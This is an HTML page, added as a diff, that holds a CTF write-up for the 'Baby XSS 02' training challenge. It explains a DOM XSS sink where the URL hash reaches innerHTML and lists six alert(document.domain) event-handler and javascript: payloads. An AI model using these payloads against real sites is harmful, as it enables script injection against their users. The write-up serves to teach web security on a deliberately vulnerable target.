@@ -1,0 +1,145 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>XSS Challenge by y0n3uchy Baby XSS 02 | frncscrlnd’s writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="XSS Challenge by y0n3uchy Baby XSS 02" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Walkthorugh/Writeup for the “Baby XSS 02” challenge, part of the “For Newbies” section of XSS Challenge by y0n3uchy." />
+<meta property="og:description" content="Walkthorugh/Writeup for the “Baby XSS 02” challenge, part of the “For Newbies” section of XSS Challenge by y0n3uchy." />
+<link rel="canonical" href="http://localhost:4000/y0n3uchy_xss/Baby-XSS-02/" />
+<meta property="og:url" content="http://localhost:4000/y0n3uchy_xss/Baby-XSS-02/" />
+<meta property="og:site_name" content="frncscrlnd’s writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="XSS Challenge by y0n3uchy Baby XSS 02" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Walkthorugh/Writeup for the “Baby XSS 02” challenge, part of the “For Newbies” section of XSS Challenge by y0n3uchy.","headline":"XSS Challenge by y0n3uchy Baby XSS 02","url":"http://localhost:4000/y0n3uchy_xss/Baby-XSS-02/"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=150d28b77225a4a207f11ff76d8d5a1e96152911">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <!--[if lt IE 9]>
+      <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!--[if lt IE 8]>
+    <link rel="stylesheet" href="/assets/css/ie.css">
+    <![endif]-->
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          displayMath: [['$$', '$$'], ['\\[', '\\]']]
+        },
+        svg: { fontCache: 'global' }
+      };
+    </script>
+    <script id="MathJax-script" async
+            src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+    </script>
+  </head>
+  <body>
+    <div class="wrapper">
+      <section>
+        <div id="title">
+          <h1>frncscrlnd's writeups</h1>
+          <p>Writeups from challenges and CTFs i take part in.</p>
+          <hr>
+          <span class="credits left">Project maintained by <a href="https://github.com/frncscrlnd">frncscrlnd</a></span>
+          <span class="credits right">Hosted on GitHub Pages &mdash; Theme by <a href="https://twitter.com/mattgraham">mattgraham</a></span>
+        </div>
+
+        <h1 id="baby-xss-02"><a href="https://xss.challenge.training.hacq.me/challenges/baby02.php">Baby XSS 02</a></h1>
+
+<p>Just like other challenges on this website, the page’s backend source is visible:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script src="hook.js"&gt;&lt;/script&gt;
+&lt;script&gt;
+    window.addEventListener("load", function() {
+        var q = location.hash.substring(1);
+        window.query.innerHTML = q == '' ? `Hello!` : (`Hello, ${decodeURI(q)}`);
+    });
+&lt;/script&gt;
+
+&lt;p id="query"&gt;&lt;/p&gt;
+
+&lt;h1&gt;inject&lt;/h1&gt;
+&lt;p&gt;Inspect the source code carefully and find where to inject :-)&lt;/p&gt;
+
+&lt;h1&gt;src&lt;/h1&gt;
+&lt;?php highlight_string(file_get_contents(basename(__FILE__))); ?&gt;
+</code></pre></div></div>
+
+<p>Also, there’s no <code class="language-plaintext highlighter-rouge">&lt;input&gt;</code> tag and the game tells us “Inspect the source code carefully and find where to inject :-)”.</p>
+
+<p>This code stands out:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>window.addEventListener("load", function() {
+    var q = location.hash.substring(1);
+    window.query.innerHTML = q == '' ? `Hello!` : (`Hello, ${decodeURI(q)}`);
+});
+</code></pre></div></div>
+
+<p>This tells us that the server will append to ‘Hello! ‘ anything we put after a <code class="language-plaintext highlighter-rouge">#</code> in the URL. An example of this could be:</p>
+
+<p><code class="language-plaintext highlighter-rouge">https://xss.challenge.training.hacq.me/challenges/baby02.php#&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p>
+
+<p>However, this will not work as <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tags will be <a href="https://w3c.github.io/DOM-Parsing/#dom-innerhtml">parsed but not executed</a>. We have to find a different way. All these payloads, that avoid using the <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tag, will work:</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">#&lt;img src=x onerror=alert(document.domain)&gt;</code></p>
+</blockquote>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">#&lt;body onload=alert(document.domain)&gt;</code></p>
+</blockquote>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">#&lt;svg onload=alert(document.domain)&gt;</code></p>
+</blockquote>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">#&lt;input onfocus=alert(document.domain) autofocus&gt;</code></p>
+</blockquote>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">#&lt;iframe src="javascript:alert(document.domain)"&gt;</code></p>
+</blockquote>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">#&lt;object data="javascript:alert(document.domain)"&gt;</code></p>
+</blockquote>
+
+
+      </section>
+
+    </div>
+  </body>
+</html>
